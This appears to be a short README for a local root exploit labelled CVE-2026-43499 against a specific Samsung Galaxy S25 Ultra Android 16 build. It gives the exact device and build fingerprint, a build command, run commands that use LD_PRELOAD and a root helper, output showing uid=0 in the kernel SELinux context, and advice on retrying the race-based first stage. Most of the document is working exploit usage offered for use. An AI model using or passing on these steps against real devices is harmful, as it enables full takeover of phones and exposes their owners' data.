Device info:
```
Device: Samsung Galaxy S25 Ultra (SM-S938N) / pa3q
Android release: 16
SDK: 36
Build number: S938NKSUACZF1
Build display ID: BP4A.251205.006.S938NKSUACZF1
Build fingerprint: samsung/pa3qksx/pa3q:16/BP4A.251205.006/S938NKSUACZF1_OKRACZF1:user/release-keys
Kernel: Linux 6.6.98-android15-8-pd6ff1cd-abogkiS938NKSUACZF1-4k
Build date: Mon Jun 1 08:35:51 UTC 2026
Architecture: aarch64
```

Build:
```sh
make PROJECT=pa3q-S938NKSUACZF1
```

Run:
```sh
LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true
/data/local/tmp/cve-2026-43499-root -c id
```

Verified result:
```text
root umh result wake=1 complete=1 retval=0 socket=1
pipe-physrw-summary done=1 root=1
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

The initial pselect stage is race-based. A run that ends with `root=0`
before the physical read/write stage can be retried.
